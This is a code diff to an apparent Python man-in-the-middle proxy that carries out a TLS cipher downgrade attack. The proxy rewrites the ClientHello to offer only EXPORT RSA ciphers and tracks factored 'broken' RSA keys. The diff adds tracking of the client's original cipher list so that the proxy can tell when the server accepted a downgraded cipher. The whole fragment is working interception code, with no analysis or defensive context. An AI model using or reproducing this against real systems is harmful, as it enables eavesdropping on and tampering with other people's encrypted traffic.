@@ -23,6 +23,8 @@ NON_EXPORT_RSA_CORRESPONDENT = {
     0x0008: 0x0009 
 }
 
+ORIGINAL_CIPHERS = []
+
 logger = logging.getLogger("mitm-proxy")
 if not logger.hasHandlers():
     logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
@@ -31,11 +33,14 @@ broken_keys = {} # Map of n -> (e, d, p, q) for broken RSA keys
 
 def parse_and_modify_clienthello(data, session: TLSSession | None = None):
     """Parse ClientHello and change supported ciphers to EXPORT only"""
+    global ORIGINAL_CIPHERS
     hello = TLSClientHello(data)
 
     logger.info("TLS ClientHello detected")
     logger.info("Original ciphers: %s", hello.ciphers)
     # Modify the cipher suites to only include EXPORT ciphers
+    if not ORIGINAL_CIPHERS:
+        ORIGINAL_CIPHERS = hello.ciphers.copy()
     new_ciphers = []
     for cipher in hello.ciphers:
         if cipher in EXPORT_RSA_CIPHERS:
@@ -71,7 +76,7 @@ def parse_serverhello(data, session: TLSSession | None = None):
     logger.info("TLS ServerHello detected")
     logger.info("Server selected cipher: %s", hello.cipher)
 
-    if hello.cipher in EXPORT_RSA_CIPHERS:
+    if hello.cipher in EXPORT_RSA_CIPHERS and not hello.cipher in ORIGINAL_CIPHERS:
         original_cipher = NON_EXPORT_RSA_CORRESPONDENT[hello.cipher]
         logger.info(f"Server accepted downgraded cipher {hello.cipher}, replacing with corresponding cipher {original_cipher}")
         #hello.cipher = original_cipher
